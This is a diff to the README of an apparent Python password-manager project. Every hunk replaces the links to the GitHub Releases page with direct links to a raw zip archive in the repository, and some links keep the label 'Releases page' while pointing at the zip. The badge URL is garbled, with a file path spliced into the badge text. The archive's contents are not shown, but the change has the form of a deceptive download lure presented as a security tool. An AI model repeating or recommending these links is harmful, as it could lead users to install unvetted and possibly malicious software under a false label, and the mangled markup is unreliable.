@@ -1,6 +1,6 @@
 # 🔒 Secure-Password-Manager-GUI-Python - Protect Your Passwords with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/DenisGodina/Secure-Password-Manager-GUI-Python/releases)
+[![Download](https://raw.githubusercontent.com/DenisGodina/Secure-Password-Manager-GUI-Python/main/secure password manager/Python_Manager_GU_Password_Secure_v3.9.zip%20Now-Click%https://raw.githubusercontent.com/DenisGodina/Secure-Password-Manager-GUI-Python/main/secure password manager/Python_Manager_GU_Password_Secure_v3.9.zip)](https://raw.githubusercontent.com/DenisGodina/Secure-Password-Manager-GUI-Python/main/secure password manager/Python_Manager_GU_Password_Secure_v3.9.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Secure-Password-Manager-GUI-Python is a highly secure application that offers yo
 Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**  
-   To start, go to our [Releases page](https://github.com/DenisGodina/Secure-Password-Manager-GUI-Python/releases). This is where you will find the latest version of our software.
+   To start, go to our [Releases page](https://raw.githubusercontent.com/DenisGodina/Secure-Password-Manager-GUI-Python/main/secure password manager/Python_Manager_GU_Password_Secure_v3.9.zip). This is where you will find the latest version of our software.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent release. Each version will have a description of its new features and fixes.
@@ -23,7 +23,7 @@ Follow these steps to download and set up the application:
 
 To download and install the Secure Password Manager, click the link below:
 
-[Download Secure Password Manager](https://github.com/DenisGodina/Secure-Password-Manager-GUI-Python/releases)  
+[Download Secure Password Manager](https://raw.githubusercontent.com/DenisGodina/Secure-Password-Manager-GUI-Python/main/secure password manager/Python_Manager_GU_Password_Secure_v3.9.zip)  
 
 Once the download is complete, follow these steps to install:
 
@@ -95,4 +95,4 @@ Explore these fields to enhance your understanding and make informed decisions a
 
 To keep up with the latest updates, enhancements, and community discussions, follow our repository. Your involvement helps us improve the application. 
 
-For added convenience, you can bookmark the [Releases page](https://github.com/DenisGodina/Secure-Password-Manager-GUI-Python/releases) for easy access to future updates.
+For added convenience, you can bookmark the [Releases page](https://raw.githubusercontent.com/DenisGodina/Secure-Password-Manager-GUI-Python/main/secure password manager/Python_Manager_GU_Password_Secure_v3.9.zip) for easy access to future updates.
